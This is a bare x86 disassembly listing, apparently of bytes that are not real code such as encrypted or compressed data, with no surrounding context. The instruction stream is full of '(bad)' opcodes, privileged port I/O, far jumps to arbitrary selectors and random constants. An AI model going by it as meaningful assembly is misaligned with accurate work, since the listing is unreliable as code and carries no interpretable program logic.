  4217a7:	xchg   ebx,eax
  4217a8:	retf   
  4217a9:	mov    esi,0x29a4a762
  4217ae:	or     dl,0xd9
  4217b1:	cmp    DWORD PTR [esi-0x78],ecx
  4217b4:	inc    esi
  4217b5:	pop    esp
  4217b6:	aam    0x19
  4217b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217b9:	sub    eax,0xb49bc1f2
  4217be:	cdq    
  4217bf:	pop    ds
  4217c0:	ret    
  4217c1:	in     al,0x50
  4217c3:	dec    edx
  4217c4:	sbb    al,0xe6
  4217c6:	aam    0x7d
  4217c8:	push   ss
  4217c9:	loop   0x42182b
  4217cb:	inc    ebp
  4217cc:	add    DWORD PTR [eax],edx
  4217ce:	ror    DWORD PTR [esi+0x78],0x3c
  4217d2:	sub    BYTE PTR [esp+ebx*1+0x26],0xc5
  4217d7:	push   es
  4217d8:	in     al,dx
  4217d9:	inc    edi
  4217da:	outs   dx,DWORD PTR ds:[esi]
  4217db:	fadd   QWORD PTR ds:0x3dedbe3d
  4217e1:	jp     0x4217e4
  4217e3:	mov    edi,ss
  4217e5:	push   es
  4217e6:	(bad)  
  4217e7:	cmp    eax,0x99563ff3
  4217ec:	pop    ebp
  4217ed:	pop    ds
  4217ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217ef:	xor    eax,0xdbd1fca4
  4217f4:	sahf   
  4217f5:	jmp    0x421824
  4217f7:	xchg   ebx,eax
  4217f8:	push   cs
  4217f9:	ds dec esp
  4217fb:	ins    DWORD PTR es:[edi],dx
  4217fc:	shr    DWORD PTR [ebp-0x18],0x2e
  421800:	push   edx
  421801:	lods   al,BYTE PTR ds:[esi]
  421802:	sbb    DWORD PTR [ecx-0x76],esp
  421805:	push   0x6b
  421807:	jne    0x4217a4
  421809:	(bad)  
  42180a:	ficomp DWORD PTR [ebx-0x198bb241]
  421810:	pop    ebx
  421811:	cwde   
  421812:	data16 mul BYTE PTR [edx+0x6]
  421816:	(bad)  
  421818:	push   0x25f09474
  42181d:	scas   al,BYTE PTR es:[edi]
  42181e:	and    dl,BYTE PTR [ecx-0xaacb26b]
  421824:	and    BYTE PTR [ebp-0x4a3d68d8],al
  42182a:	pop    ss
  42182b:	push   DWORD PTR [eax]
  42182d:	into   
  42182e:	jbe    0x42181d
  421830:	adc    BYTE PTR [esi],ch
  421832:	ret    
  421833:	ds dec eax
  421835:	outs   dx,BYTE PTR ds:[esi]
  421836:	and    bl,BYTE PTR [eax+0x23497996]
  42183c:	sbb    eax,0x36d83fe7
  421841:	jne    0x421897
  421843:	push   gs
  421845:	sub    al,0xe7
  421847:	or     eax,0x88f6b875
  42184c:	push   ebx
  42184d:	and    edi,DWORD PTR [edi]
  42184f:	scas   al,BYTE PTR es:[edi]
  421850:	cmp    DWORD PTR [edx-0x50982d5a],edi
  421856:	aaa    
  421857:	(bad)  
  421858:	push   DWORD PTR [ebp+0x4d]
  42185b:	jecxz  0x421812
  42185d:	sbb    DWORD PTR [edi+ecx*2],ebx
  421860:	sbb    ch,ch
  421862:	inc    ecx
  421863:	pop    edx
  421864:	mov    WORD PTR [eax+0x79],gs
  421867:	cmp    al,0x66
  421869:	jmp    0xd3aa:0x8cb4de40
  421870:	pusha  
  421871:	inc    esi
  421872:	bound  esp,QWORD PTR [ecx+0x5a4fb5e3]
  421878:	inc    ecx
  421879:	shl    BYTE PTR [edi+0x36],cl
  42187c:	aaa    
  42187d:	inc    edx
  42187e:	mov    eax,0x8bab3d79
  421883:	mov    edi,0xac7109d8
  421888:	xchg   edi,eax
  421889:	mov    al,0x13
  42188b:	ins    BYTE PTR es:[edi],dx
  42188c:	dec    eax
  42188d:	icebp  
  42188e:	leave  
  42188f:	sbb    al,0x4c
  421891:	sbb    DWORD PTR [edx-0x31],eax
  421894:	retf   0x27c4
  421897:	push   0x4b857352
  42189c:	sbb    BYTE PTR [edx+0x10],cl
  42189f:	inc    esi
  4218a0:	or     eax,0x76f4c8d6
  4218a5:	cmp    eax,0xfbb5d662
  4218aa:	retf   0x6a85
  4218ad:	(bad)  
  4218ae:	out    0x1d,eax
  4218b0:	stos   DWORD PTR es:[edi],eax
  4218b1:	in     eax,dx
  4218b2:	cmp    BYTE PTR [eax-0x43821db4],al
  4218b8:	shr    DWORD PTR [esi+0x6a],1
  4218bb:	ds pusha 
  4218bd:	and    esp,edi
  4218bf:	js     0x4218f7
  4218c1:	xchg   BYTE PTR [ecx],dh
  4218c3:	jnp    0x4218f6
  4218c5:	out    0xbc,eax
  4218c7:	(bad)  
  4218c8:	fild   DWORD PTR [ecx]
  4218ca:	je     0x421885
  4218cc:	jne    0x4218be
  4218ce:	jge    0x4218e4
  4218d0:	or     cl,BYTE PTR [edi+0x3a661175]
  4218d6:	xchg   BYTE PTR [esi],cl
  4218d8:	cmp    ebx,DWORD PTR [ebp+0x13ad7310]
  4218de:	arpl   sp,bx
  4218e0:	test   DWORD PTR [ecx-0x42],esi
  4218e3:	cmp    BYTE PTR [esi],cl
  4218e5:	or     edi,edi
  4218e7:	sub    BYTE PTR [edx+edx*1-0x2c3d21e],0x5
  4218ef:	and    eax,0x3a055384
  4218f4:	js     0x42191a
  4218f6:	ins    BYTE PTR es:[edi],dx
  4218f7:	jne    0x421955
  4218f9:	add    DWORD PTR [ecx],ecx
  4218fb:	push   ds
  4218fc:	bound  esp,QWORD PTR [ebp-0x47]
  4218ff:	arpl   ax,ax
  421901:	mov    eax,ds:0xb1957166
  421906:	scas   eax,DWORD PTR es:[edi]
  421907:	(bad)  
  421908:	push   ecx
  421909:	out    dx,eax
  42190a:	mov    ecx,ebp
  42190c:	inc    edi
  42190d:	xchg   DWORD PTR ds:[ecx],eax
  421910:	jb     0x4218cc
  421912:	xor    bh,al
  421914:	rcr    ah,1
  421916:	in     al,dx
  421917:	xor    edi,eax
  421919:	jmp    0x421e2b
  42191e:	sar    DWORD PTR [edi],cl
  421920:	int3   
  421921:	int3   
  421922:	int3   
  421923:	rcl    ebx,cl
  421925:	aas    
  421926:	in     al,0x4c
  421928:	mov    bh,0x25
  42192a:	push   edi
  42192b:	daa    
  42192c:	cmp    dl,BYTE PTR [ebx+0x787f6e71]
  421932:	jae    0x4219b0
  421934:	js     0x4219ae
  421936:	jmp    0x9e0b:0x2759304b
  42193d:	sbb    al,0xdd
  42193f:	jmp    0xde09:0x6e9ef0bf
  421946:	sub    DWORD PTR [ecx+0x4b],ebp
  421949:	mov    ds:0x114f3a89,al
  42194e:	push   ecx
  42194f:	adc    ch,BYTE PTR [eax+ecx*1-0x64a5ab89]
  421956:	mov    dh,bh
  421958:	fstp   TBYTE PTR [ebx-0x1b450003]
  42195e:	dec    edi
  42195f:	ret    0x9272
  421962:	xor    BYTE PTR [eax],ch
  421964:	and    esi,DWORD PTR [ecx-0x1b1ef182]
  42196a:	push   es
  42196b:	retf   0x718
  42196e:	fadd   QWORD PTR [ecx+edx*2]
  421971:	bound  eax,QWORD PTR [ebx+edi*1+0x65]
  421975:	lds    ecx,FWORD PTR [ebx-0x39724bc2]
  42197b:	add    ch,BYTE PTR [edi-0x3a2c73f9]
  421981:	jno    0x4219ac
  421983:	fdiv   st,st(1)
  421985:	mov    eax,0x6b9070f0
  42198a:	popa   
  42198b:	dec    ebp
  42198c:	push   ss
  42198d:	call   0x83614a37
  421992:	and    bh,BYTE PTR [esi+0x35]
  421995:	imul   ecx,DWORD PTR ds:0x71def464,0xa32c5b81
  42199f:	nop
  4219a0:	xor    esp,DWORD PTR [esi+0x36ae1650]
  4219a6:	and    eax,0x964351a
  4219ab:	mov    edi,0x8aba0468
  4219b0:	in     eax,0xba
  4219b2:	int    0xce
  4219b4:	push   es
  4219b5:	lahf   
  4219b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219b7:	and    dh,BYTE PTR [edx+0x64]
  4219ba:	pop    eax
  4219bb:	mov    eax,0x931c9c9e
  4219c0:	lahf   
  4219c1:	xchg   esi,eax
  4219c2:	jbe    0x4219a5
  4219c4:	lods   al,BYTE PTR ds:[esi]
  4219c5:	adc    edi,DWORD PTR [edi+0x5e]
  4219c8:	ss (bad) 
  4219ca:	xchg   BYTE PTR fs:[ebx+0x41],dl
  4219ce:	mov    ah,0x70
  4219d0:	mov    ds:0x70b3eda9,eax
  4219d5:	aaa    
  4219d6:	out    dx,eax
  4219d7:	aam    0x53
  4219d9:	ret    
  4219da:	push   cs
  4219db:	xchg   BYTE PTR [edx],bh
  4219dd:	or     BYTE PTR [ecx],dl
  4219df:	add    eax,0x91734b69
  4219e4:	int    0x88
  4219e6:	or     esi,DWORD PTR [edi]
  4219e8:	ficomp WORD PTR [edi+0x1317f66a]
  4219ee:	inc    edx
  4219ef:	inc    ebx
  4219f0:	xor    edx,esi
  4219f2:	pop    ds
  4219f3:	pop    ss
  4219f4:	xchg   edi,eax
  4219f5:	outs   dx,BYTE PTR ds:[esi]
  4219f6:	popf   
  4219f7:	std    
  4219f8:	mul    DWORD PTR [edx+0x2a91c94]
  4219fe:	hlt    
  4219ff:	or     eax,0xa3fe6f72
  421a04:	loopne 0x4219d1
  421a06:	scas   al,BYTE PTR es:[edi]
  421a07:	mov    eax,ds:0xfe83301e
  421a0c:	mov    ebx,0xe500d411
  421a11:	inc    eax
  421a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a13:	mov    bl,0xaf
  421a15:	das    
  421a16:	pop    ebp
  421a17:	ins    BYTE PTR es:[edi],dx
  421a18:	xchg   edi,esi
  421a1a:	ror    DWORD PTR [esi+0x46c4bd4],0xa0
  421a21:	hlt    
  421a22:	mov    ch,0xfb
  421a24:	std    
  421a25:	mov    cl,0x49
  421a27:	dec    edi
  421a28:	aad    0x79
  421a2a:	xchg   ebp,eax
  421a2b:	pop    ebx
  421a2c:	sub    al,0x25
  421a2e:	rcl    BYTE PTR [edx],cl
  421a30:	arpl   WORD PTR [ecx],cx
  421a32:	test   cl,dh
  421a34:	push   0x1399637a
  421a39:	fldcw  WORD PTR [ecx+0x6b7efefb]
  421a3f:	mov    dh,0x7c
  421a41:	or     al,0x1b
  421a43:	and    eax,0x8ee99c60
  421a48:	iret   
  421a49:	hlt    
  421a4a:	mov    ah,0x6c
  421a4c:	cld    
  421a4d:	add    dl,BYTE PTR [ebx-0x2b]
  421a50:	pop    ebp
  421a51:	popf   
  421a52:	lods   eax,DWORD PTR ds:[esi]
  421a53:	mov    BYTE PTR [ebp+ebp*4-0xa89551],dh
  421a5a:	add    DWORD PTR [edx-0x5f],ecx
  421a5d:	call   0x46beca3e
  421a62:	jle    0x421a8f
  421a64:	push   esi
  421a65:	mov    bh,0xc7
  421a67:	in     eax,dx
  421a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a69:	sbb    al,0x85
  421a6b:	out    dx,eax
  421a6c:	iret   
  421a6d:	not    ebp
  421a6f:	jb     0x421a59
  421a71:	jmp    0x66ab:0xfa411b9b
  421a78:	nop
  421a79:	out    0x9,eax
  421a7b:	inc    ebp
  421a7c:	aaa    
  421a7d:	gs into 
  421a7f:	fdiv   QWORD PTR ds:0x5e698ad7
  421a85:	xor    BYTE PTR [ebp-0x3a84bfde],0x24
  421a8c:	rol    bh,0x8f
  421a8f:	loope  0x421a44
  421a91:	push   ebp
  421a92:	nop
  421a93:	jg     0x421ae6
  421a95:	sbb    al,0x6c
  421a97:	mov    esi,0x528c903f
  421a9c:	lods   eax,DWORD PTR ds:[esi]
  421a9d:	dec    edx
  421a9e:	sub    eax,0xb4e6c15e
  421aa3:	jle    0x421a84
  421aa5:	fisttp QWORD PTR [eax]
  421aa7:	jg     0x421a68
  421aa9:	push   es
  421aaa:	xlat   BYTE PTR ds:[ebx]
  421aab:	mov    dl,0x68
  421aad:	push   ds
  421aae:	xlat   BYTE PTR ds:[ebx]
  421aaf:	iret   
  421ab0:	and    eax,0xa904b28f
  421ab5:	not    DWORD PTR ds:0x5db068aa
  421abb:	(bad)  [edi-0xf6e390b]
  421ac1:	(bad)  
  421ac2:	jge    0x421ac0
  421ac4:	mov    esi,0xf82acaec
  421ac9:	jbe    0x421a8f
  421acb:	cwde   
  421acc:	push   edi
  421acd:	add    ch,BYTE PTR ds:0x1204c8b3
  421ad3:	pop    es
  421ad4:	aad    0x79
  421ad6:	lds    ecx,FWORD PTR [edi-0x1433356e]
  421adc:	pusha  
  421add:	add    DWORD PTR [ecx],edi
  421adf:	xor    DWORD PTR [edi],0x8687b9e6
  421ae5:	add    ebp,DWORD PTR [ebx-0xdce5d05]
  421aeb:	test   DWORD PTR [edx+eax*2+0x62],esp
  421aef:	lods   al,BYTE PTR ds:[si]
  421af1:	inc    esp
  421af2:	xchg   ax,ax
  421af4:	lods   al,BYTE PTR ds:[esi]
  421af5:	pop    eax
  421af6:	xchg   al,dh
  421af8:	call   0x8afe:0xf8ad3d7f
  421aff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b00:	fcmovb st,st(6)
  421b02:	mov    dh,0x99
  421b04:	fistp  WORD PTR [ebp+0x2f470f98]
  421b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b0b:	daa    
  421b0c:	lods   eax,DWORD PTR ds:[esi]
  421b0d:	sub    al,0xcb
  421b0f:	push   ds
  421b10:	and    ch,BYTE PTR [edx]
  421b12:	pop    esp
  421b13:	hlt    
  421b14:	stc    
  421b15:	fisttp WORD PTR [ebp+0x53]
  421b18:	push   esi
  421b19:	rcl    BYTE PTR [esi-0x2a],cl
  421b1c:	sbb    eax,0xe1efeb3d
  421b21:	fild   DWORD PTR [eax+0x76]
  421b24:	sub    BYTE PTR [esp+edi*4],bl
  421b27:	jnp    0x421b6f
  421b29:	cmp    eax,0xfb3d95f1
  421b2e:	push   ds
  421b2f:	dec    ecx
  421b30:	dec    edi
  421b31:	jp     0x421aec
  421b33:	lods   al,BYTE PTR ds:[esi]
  421b34:	lea    ecx,[esi-0x4c]
  421b37:	leave  
  421b38:	lods   eax,DWORD PTR ds:[esi]
  421b39:	cmp    esi,DWORD PTR [eax+0x6021087d]
  421b3f:	ins    BYTE PTR es:[edi],dx
  421b40:	push   esp
  421b41:	(bad)  
  421b42:	rol    BYTE PTR [ebx],cl
  421b44:	imul   ecx,DWORD PTR [edi],0xffffffb1
  421b47:	inc    edx
  421b48:	mov    WORD PTR [eax+0x60350ad8],?
  421b4e:	add    BYTE PTR ds:0x66281fa4,0x2b
  421b55:	mov    eax,0x136b5998
  421b5a:	xchg   esi,eax
  421b5b:	xchg   ebx,eax
  421b5c:	inc    ebp
  421b5d:	mov    ah,0x36
  421b5f:	sub    esp,edi
  421b61:	ficom  DWORD PTR [ecx+0x31676772]
  421b67:	xchg   esi,eax
  421b68:	cld    
  421b69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b6a:	xor    al,0xdc
  421b6c:	inc    esp
  421b6d:	scas   eax,DWORD PTR es:[edi]
  421b6e:	data16 adc bl,al
  421b71:	or     ch,BYTE PTR [esi+0x3bd6ff98]
  421b77:	popf   
  421b78:	sub    DWORD PTR [ebx+0x3218706],ebp
  421b7e:	xor    ch,BYTE PTR [ebp+ebp*1-0x1b1b963f]
  421b85:	pop    esp
  421b86:	xor    al,0xc
  421b88:	data16 sti 
  421b8a:	dec    ecx
  421b8b:	adc    dl,bl
  421b8d:	int3   
  421b8e:	lea    ebx,fs:[edx+ecx*8+0x66a92dfa]
  421b96:	pop    ebx
  421b97:	stc    
  421b98:	xor    esp,DWORD PTR [eax+0x5f]
  421b9b:	xchg   BYTE PTR [ebx-0x25],dh
  421b9e:	adc    cl,BYTE PTR [eax+0x4a]
  421ba1:	xchg   esi,eax
  421ba2:	ja     0x421beb
  421ba4:	jne    0x421bf7
  421ba6:	loop   0x421b7e
  421ba8:	add    DWORD PTR [eax],esi
  421baa:	push   ecx
  421bab:	xchg   DWORD PTR [esi+0x150b0d06],esp
  421bb1:	cmp    eax,0x9311ad20
  421bb6:	imul   esp,ecx,0xffffffa4
  421bb9:	mov    DWORD PTR gs:[ecx+0x775124ac],edi
  421bc0:	cmp    al,0x34
  421bc2:	pushf  
  421bc3:	add    DWORD PTR [esi],edi
  421bc5:	sbb    BYTE PTR [ebp+0x52],ah
  421bc8:	popa   
  421bc9:	sahf   
  421bca:	je     0x421b52
  421bcc:	test   al,0xbd
  421bce:	repnz icebp 
  421bd0:	test   edx,esi
  421bd2:	or     ecx,ecx
  421bd4:	popw   es
  421bd6:	mov    edi,0x8e561c3a
  421bdb:	shl    BYTE PTR [ebx+0x69],cl
  421bde:	mov    ah,0x83
  421be0:	lods   eax,DWORD PTR ds:[esi]
  421be1:	aas    
  421be2:	mov    ebp,0x12be8982
  421be7:	sti    
  421be8:	jne    0x421c5a
  421bea:	lahf   
  421beb:	imul   ebp,esi,0x8a10c66e
  421bf1:	sub    eax,0x5d1727d9
  421bf6:	xchg   DWORD PTR [ecx],esi
  421bf8:	jbe    0x421c20
  421bfa:	xchg   DWORD PTR [ebx-0x31],esi
  421bfd:	mov    eax,ds:0xafb3ca7d
  421c02:	cmp    al,0xab
  421c04:	mov    esp,0x29abcce5
  421c09:	dec    ebx
  421c0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c0b:	psrlq  mm2,QWORD PTR [eax]
  421c0e:	inc    edx
  421c0f:	mov    ebp,0x53b23ccd
  421c14:	enter  0x7c84,0x63
  421c18:	fmul   DWORD PTR [esi]
  421c1a:	sbb    al,0xe2
  421c1c:	dec    eax
  421c1d:	inc    esp
  421c1e:	cld    
  421c1f:	sub    eax,0x637647c3
  421c24:	not    DWORD PTR [ebp+0x2995a468]
  421c2a:	sub    eax,0x1dbea699
  421c2f:	push   edx
  421c30:	mov    ah,0x76
  421c32:	add    al,0xc1
  421c34:	(bad)  
  421c35:	jp     0x421c05
  421c37:	fstp   DWORD PTR [edi]
  421c39:	mov    WORD PTR [edx+0x68],es
  421c3c:	xchg   BYTE PTR [esi],bl
  421c3e:	and    bl,BYTE PTR [edi-0xa219eb9]
  421c44:	xor    al,0x51
  421c46:	xor    ebp,DWORD PTR [esp+ecx*1]
  421c49:	pop    ss
  421c4a:	cs cdq 
  421c4c:	(bad)  
  421c4d:	xor    al,0x50
  421c4f:	cmp    DWORD PTR [edx],edx
  421c51:	or     eax,0xf5fa8ce0
  421c56:	adc    edx,DWORD PTR [ebx-0x78]
  421c59:	iret   
  421c5a:	popa   
  421c5b:	sub    eax,0x571e0d78
  421c60:	push   es
  421c61:	scas   eax,DWORD PTR es:[edi]
  421c62:	add    DWORD PTR [ebp+0x6bd33922],edi
  421c68:	mov    edi,0x550413e6
  421c6d:	out    0xc0,al
  421c6f:	jne    0x421cc6
  421c71:	jmp    0x124e13b0
  421c76:	lea    edx,[esi-0x614cf226]
  421c7c:	pop    ebx
  421c7d:	adc    al,0x21
  421c7f:	aad    0xc2
  421c81:	dec    edx
  421c82:	dec    esp
  421c83:	adc    cl,BYTE PTR ds:0xb2fb4378
  421c89:	rcl    BYTE PTR [ebx],cl
  421c8b:	mov    cl,0x18
  421c8d:	push   edx
  421c8e:	mov    ecx,0x8ddd058e
  421c93:	lods   al,BYTE PTR ds:[esi]
  421c94:	xor    al,0xb2
  421c96:	mov    dh,0xb8
  421c98:	stos   BYTE PTR es:[edi],al
  421c99:	xlat   BYTE PTR ds:[ebx]
  421c9a:	jne    0x421c4e
  421c9c:	xor    eax,0x75085bba
  421ca1:	push   esp
  421ca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ca3:	das    
  421ca4:	stc    
  421ca5:	xor    al,0x3c
  421ca7:	inc    ebp
  421ca8:	test   eax,0x9e296720
  421cad:	or     DWORD PTR [esi],ecx
  421caf:	addr16 enter 0x959c,0xfb
  421cb4:	mov    ch,0x19
  421cb6:	mov    WORD PTR [ebx+0x69a0660a],ds
  421cbc:	sbb    BYTE PTR ds:0x2a7316c1,ah
  421cc2:	fmul   DWORD PTR [ebx+eax*4]
  421cc5:	cmp    eax,0xd235ee63
  421cca:	pop    esp
  421ccb:	cli    
  421ccc:	fcom   QWORD PTR [ebx-0xd04a622]
  421cd2:	pop    edi
  421cd3:	push   eax
  421cd4:	pop    es
  421cd5:	sbb    ch,BYTE PTR ds:0xff1c5bde
  421cdb:	add    al,0x26
  421cdd:	out    dx,al
  421cde:	push   eax
  421cdf:	outs   dx,DWORD PTR ds:[esi]
  421ce0:	das    
  421ce1:	push   ds
  421ce2:	add    esi,DWORD PTR [edx-0x10ba95b6]
  421ce8:	sub    ebp,DWORD PTR [ebx-0x17]
  421ceb:	xchg   BYTE PTR [eax-0x2aad9751],ch
  421cf1:	and    edi,DWORD PTR [eax+ecx*8+0x9]
  421cf5:	gs test al,al
  421cf8:	aad    0xca
  421cfa:	pusha  
  421cfb:	dec    ebp
  421cfc:	push   esi
  421cfd:	cdq    
  421cfe:	mov    bl,0xd3
  421d00:	jnp    0x421c83
  421d02:	sbb    DWORD PTR [edi-0x22546b49],edx
  421d08:	sub    edi,DWORD PTR [ebp-0x5d4974b4]
  421d0e:	pop    esi
  421d0f:	into   
  421d10:	cmp    al,0xb5
  421d12:	pushf  
  421d13:	hlt    
  421d14:	sub    al,0xde
  421d16:	icebp  
  421d17:	cmp    BYTE PTR [esi-0x31],ah
  421d1a:	sbb    dh,ch
  421d1c:	pop    edx
  421d1d:	jns    0x421cef
  421d1f:	in     eax,dx
  421d20:	dec    ebp
  421d21:	inc    edi
  421d22:	call   esp
  421d24:	and    DWORD PTR [esi+0x217f7361],ebp
  421d2a:	adc    eax,0x10e971cc
  421d2f:	inc    edi
  421d30:	or     eax,DWORD PTR [edi+0x20a2634e]
  421d36:	fiadd  DWORD PTR [esi-0x48]
  421d39:	stos   BYTE PTR es:[edi],al
  421d3a:	dec    edx
  421d3b:	or     esi,edi
  421d3d:	pop    esp
  421d3e:	dec    eax
  421d3f:	sub    BYTE PTR [ebp+0x31a660bb],bh
  421d45:	loope  0x421d68
  421d47:	rcl    DWORD PTR [edi-0x1a48f93b],0x90
  421d4e:	xor    eax,0x25b08930
  421d53:	jmp    0x421d77
  421d55:	mov    bh,0x1f
  421d57:	leave  
  421d58:	inc    ebp
  421d59:	test   BYTE PTR [ebx+edi*4],dl
  421d5c:	push   esi
  421d5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d5e:	stos   BYTE PTR es:[edi],al
  421d5f:	bound  edx,QWORD PTR [ebp-0x17]
  421d62:	fwait
  421d63:	int    0x18
  421d65:	div    DWORD PTR [eax-0x3afb092a]
  421d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d6c:	and    DWORD PTR [ebx+0x4e],esi
  421d6f:	mov    ecx,0x93c08618
  421d74:	lea    ebp,[ebp-0x7a]
  421d77:	jno    0x421d8c
  421d79:	push   es
  421d7a:	lock adc dh,BYTE PTR [ebx-0x36324357]
  421d81:	jae    0x421d28
  421d83:	jmp    0x421d52
  421d85:	push   edi
  421d86:	or     bh,cl
  421d88:	inc    ebx
  421d89:	jbe    0x421d25
  421d8b:	scas   al,BYTE PTR es:[edi]
  421d8c:	pop    edx
  421d8d:	push   ebx
  421d8e:	xor    bh,BYTE PTR [edx+esi*1]
  421d91:	sub    al,0xa4
  421d93:	bound  ecx,QWORD PTR [eax+0x9]
  421d96:	push   esp
  421d97:	sub    eax,0xc25788e0
  421d9c:	xchg   ch,dl
  421d9e:	push   es
  421d9f:	xlat   BYTE PTR ds:[ebx]
  421da0:	and    dl,BYTE PTR [ebp+0x5c902d26]
  421da6:	mov    WORD PTR [edi+esi*2],?
  421da9:	jnp    0x421dbd
  421dab:	rol    BYTE PTR ds:0xfd4bb79d,cl
  421db1:	cwde   
  421db2:	loopne 0x421df7
  421db4:	push   edi
  421db5:	loopne 0x421de9
  421db7:	jl     0x421da6
  421db9:	sub    eax,0x2277f952
  421dbe:	cmp    al,dh
  421dc0:	rcl    DWORD PTR [ebx+ebp*1+0x12],cl
  421dc4:	cs push esp
  421dc6:	lds    edx,FWORD PTR [edi-0x6252ee67]
  421dcc:	jne    0x421d77
  421dce:	mov    dh,0xf2
  421dd0:	clc    
  421dd1:	inc    ebp
  421dd2:	jbe    0x421e36
  421dd4:	ss daa 
  421dd6:	stos   BYTE PTR es:[edi],al
  421dd7:	les    ecx,FWORD PTR [eax]
  421dd9:	arpl   ax,ax
  421ddb:	jle    0x421d73
  421ddd:	popa   
  421dde:	pop    ebx
  421ddf:	inc    ebx
  421de0:	adc    eax,0x3b1fe362
  421de5:	xor    bl,BYTE PTR ds:0x5d70ecee
  421deb:	mov    dl,0xf9
  421ded:	jbe    0x421e6c
  421def:	arpl   dx,bx
  421df1:	ja     0x421d7a
  421df3:	pop    ecx
  421df4:	dec    edx
  421df5:	pop    ecx
  421df6:	xchg   ebx,eax
  421df7:	pop    es
  421df8:	xchg   edi,eax
  421df9:	jmp    0x421e69
  421dfb:	das    
  421dfc:	mov    bl,0xcd
  421dfe:	xchg   ebp,eax
  421dff:	cwde   
  421e00:	aad    0xa2
  421e02:	dec    eax
  421e03:	call   0xbd02:0xe91de002
  421e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e0b:	stos   BYTE PTR es:[edi],al
  421e0c:	loop   0x421dd0
  421e0e:	shl    DWORD PTR [esi],0x54
  421e11:	add    al,0xfe
  421e13:	mov    edx,0x5bcc0719
  421e18:	jmp    0x3ffb:0x94bfdae3
  421e1f:	ret    
  421e20:	(bad)  
  421e21:	sub    BYTE PTR [ebp+0x10],dl
  421e24:	repnz pop es
  421e26:	jge    0x421e4b
  421e28:	mov    ecx,DWORD PTR [esi-0x1606fc3a]
  421e2e:	or     eax,0xc4000005
  421e33:	ds (bad) 
  421e35:	xlat   BYTE PTR ds:[ebx]
  421e36:	retf   0xd9d7
  421e39:	ror    DWORD PTR [eax+ebx*2+0xf],1
  421e3d:	xchg   esi,eax
  421e3e:	jns    0x421dc3
  421e40:	call   0x7378:0x7f716436
  421e47:	jl     0x421ec1
  421e49:	js     0x421e12
  421e4b:	in     al,dx
  421e4c:	push   ss
  421e4d:	lds    esi,FWORD PTR [ecx]
  421e4f:	push   0x798a18ae
  421e54:	shr    BYTE PTR [edx-0x19],0xab
  421e58:	rol    BYTE PTR ds:0x77a75261,cl
  421e5e:	loop   0x421eb1
  421e60:	mov    al,ds:0x66507e80
  421e65:	sub    dh,BYTE PTR [eax]
  421e67:	dec    edi
  421e68:	cdq    
  421e69:	fiadd  WORD PTR [ecx+ecx*4+0x22680df1]
  421e70:	iret   
  421e71:	mov    ds:0xd8a20422,al
  421e76:	mov    WORD PTR fs:[ecx-0x78a1e1b0],?
  421e7d:	fistp  QWORD PTR [ebx+edi*4-0x47]
  421e81:	sub    eax,0x2a110
  421e86:	push   es
  421e87:	add    al,0x32
  421e89:	fwait
  421e8a:	add    al,0x9d
  421e8c:	mov    dh,bh
  421e8e:	arpl   WORD PTR [esi+0x55202360],di
  421e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e95:	aaa    
  421e96:	push   edi
  421e97:	add    eax,0xf3a354b9
  421e9c:	dec    eax
  421e9d:	mov    WORD PTR [ecx+0x0],gs
  421ea0:	mov    cs,WORD PTR [ebx]
  421ea2:	sub    dh,BYTE PTR [edi]
  421ea4:	mov    eax,ds:0x6c8a0e5
  421ea9:	cmc    
  421eaa:	xchg   edx,eax
  421eab:	mov    cl,0xcd
  421ead:	imul   esp,DWORD PTR [ebp-0x47],0x98863802
  421eb4:	imul   ebp,DWORD PTR fs:[edi],0xffffffb5
  421eb8:	je     0x421e69
  421eba:	or     DWORD PTR [edi+edx*2+0x2238ab1d],edi
  421ec1:	out    dx,al
  421ec2:	call   FWORD PTR [ebp+edx*1+0x59]
  421ec6:	js     0x421eaa
  421ec8:	pop    esp
  421ec9:	cmp    ecx,ecx
  421ecb:	cmp    ebp,DWORD PTR [ecx+ebp*2]
  421ece:	pop    edx
  421ecf:	ficomp WORD PTR [ebx]
  421ed1:	shl    BYTE PTR [esi-0x7d],1
  421ed4:	bnd ret 0xf10f
  421ed8:	iret   
  421ed9:	adc    DWORD PTR [ebx*1-0x5a07a235],edi
  421ee0:	cmp    edi,ebx
  421ee2:	je     0x421ec7
  421ee4:	cmp    DWORD PTR [edx-0x43],ecx
  421ee7:	outs   dx,DWORD PTR ds:[esi]
  421ee8:	inc    ebp
  421ee9:	adc    al,0x52
  421eeb:	ret    
  421eec:	ss xchg edi,eax
  421eee:	jmp    0x207a:0x39b172ed
  421ef5:	inc    edx
  421ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ef7:	jbe    0x421eeb
  421ef9:	mov    eax,0xfc7edd6f
  421efe:	enter  0xc703,0xb3
  421f02:	bound  edi,QWORD PTR [edi+0x3]
  421f05:	jns    0x421f50
  421f07:	push   cs
  421f08:	inc    edx
  421f09:	xchg   esi,eax
  421f0a:	mov    bh,bh
  421f0c:	in     al,dx
  421f0d:	xchg   BYTE PTR [edi+0x74268db2],dh
  421f13:	(bad)  
  421f14:	in     eax,dx
  421f15:	mov    ch,0xc2
  421f17:	sub    ebx,edx
  421f19:	xchg   DWORD PTR [esi-0x3a598cbc],edi
  421f1f:	jns    0x421eb7
  421f21:	inc    esi
  421f22:	xor    cl,BYTE PTR [eax+0x1089b88f]
  421f28:	sub    eax,0x7b37170c
  421f2d:	push   edi
  421f2e:	enter  0xcaa6,0xc4
  421f32:	enter  0x7516,0x3f
  421f36:	pop    es
  421f37:	push   es
  421f38:	add    al,0xed
  421f3a:	pop    ds
  421f3b:	mov    al,ds:0x69dc582e
  421f40:	adc    BYTE PTR [ecx-0x1f672233],dl
  421f46:	jb     0x421f48
